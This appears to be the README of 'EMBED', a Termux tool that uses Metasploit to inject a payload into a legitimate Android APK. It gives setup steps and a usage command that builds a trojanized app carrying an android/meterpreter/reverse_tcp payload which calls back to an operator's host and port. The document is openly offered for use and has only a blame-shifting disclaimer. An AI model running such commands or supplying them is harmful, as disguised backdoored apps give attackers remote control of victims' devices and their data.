# EMBED v.2.0
This tool creates a payload with metasploit framework and injected into a legitimate APK.

	DISCLAIMER
If the law is violated with it's use, this would be the responsibility of the user who handled it..
Ivam3 is not responsible for the misuse that can be given to everything that this laboratory entails

# REQUIREMENTS.
- Metasploit
- Java
- Keytool
- Apktool
- Jarsigner
- Zipalign

# INSTALLATION.
Give execute permissions to the configuration file setup:

	$  chmod +x setup

Now run the setup file:

	$  bash setup

This file will install and configure Termux with all the required libraries and dependencies including java for termux.


# JAVA FOR TERMUX

	https://github.com/ivam3/java

This software and related documentation are provided under license agreement containing in www.java.com. Please refer to http://java.com/licensereadme.

# USAGE

	$ ruby EMBED.rb PATH/to/legitim.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4546

	._____ __  __ ____  _____ ____
	| ____|  \/  | __ )| ____|  _ \
	|  _| |TERMUX|  _ \|  _| | | | |
	| |___| |\/| | |_) | |___| |_| |
	|_____|_|  |_|____/|_____|____/ v.2
	#:::::::: By Ivam3 ::::::::::::#

	[Usage]─➤ EMBED.rb [target.apk] [msfvenom options]

This tool was written by Ivam3, <https://t.me/Ivam3byCinderella>
Some maintenance releases have been done by <https://t.me/Ivam3_Bot>

